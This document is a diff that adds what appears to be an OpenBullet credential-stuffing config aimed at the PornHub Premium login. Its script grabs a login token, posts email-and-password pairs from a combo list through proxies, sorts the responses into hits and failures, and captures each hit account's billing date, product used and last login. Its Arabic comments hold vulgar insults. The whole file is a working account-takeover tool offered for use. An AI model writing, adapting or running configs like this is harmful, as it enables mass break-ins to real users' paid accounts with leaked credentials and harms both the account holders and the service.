@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "PornHub",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-04T05:45:55.0231924+01:00",
+  "AdditionalInfo": "",
+  "Author": "IpProxies",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#شايفك REQUEST GET "https://www.pornhubpremium.com/premium/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#يعرص PARSE "<SOURCE>" LR "\"token\":\"" "\",\"" -> VAR "token" 
+
+#يلي_ FUNCTION Constant "<token>" -> VAR "TOKAN" 
+
+#بتكراك REQUEST POST "https://www.pornhubpremium.com/front/authenticate" 
+  CONTENT "username=<USER>&password=<PASS>&token=<TOKAN>&redirect=&from=pc_premium_login&segment=straight" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Host: www.pornhubpremium.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://www.pornhubpremium.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "DNT: 1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Referer: https://www.pornhubpremium.com/premium/login" 
+  HEADER "Accept-Language: en,en-US;q=0.9,ar;q=0.8" 
+
+#عشان KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\",\"premium_redirect_cookie\":\"1\",\"" 
+  KEYCHAIN Failure OR 
+    KEY "\":\"Invalid username" 
+    KEY "\":\"\",\"premium_redirect_cookie\":\"0\"," 
+
+#تتفرج REQUEST GET "https://www.pornhubpremium.com/user/manage/start" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#علي PARSE "<SOURCE>" LR "<p id=\"expiryDatePremium\">Next Billing Date " "</date></p>" -> CAP "Renew" 
+
+#سكس PARSE "<SOURCE>" LR "\"Latest Product Used\":\"" "\",\"" -> CAP "Package" 
+
+#هتشيلونا_زنوب_يولاد_العرص PARSE "<SOURCE>" LR "Last Login\":\"" "\"" -> CAP "Last visit" "" " ^^By IpProxeis" 
+
